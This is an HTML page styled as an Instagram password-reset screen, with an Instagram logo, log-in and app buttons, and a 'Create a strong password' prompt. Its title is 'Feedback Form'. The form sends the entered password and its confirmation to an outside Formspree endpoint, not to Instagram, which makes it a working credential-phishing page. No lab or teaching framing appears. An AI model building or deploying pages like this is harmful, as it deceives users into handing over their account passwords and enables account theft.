<!DOCTYPE html>
<html>
<head>
  <title>Feedback Form</title>
  <link rel="stylesheet" href="style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
</head>
<body>
<header>
<div><img src="instagram.png"></div>
<div><a href="">Log in</a><button>Open App</button></div>
</header>
<div id="wrapper">
<h1 >Create a strong password</h1>
<p>Your password must be at least six characters and should include a combination of numbers, letters and special characters (!$@%).</p>
</div>

<form action="https://formspree.io/f/xanqjwkr" method="POST">
  <input id="input1" type="password" name="password" placeholder="New password" >
  <input id="input2" type="password" name="confirm_password" placeholder="New password, again" >
  <button id="button">Reset Password</button>
</form>
<script src="script.js" type="text/javascript"></script>
</body>
</html>
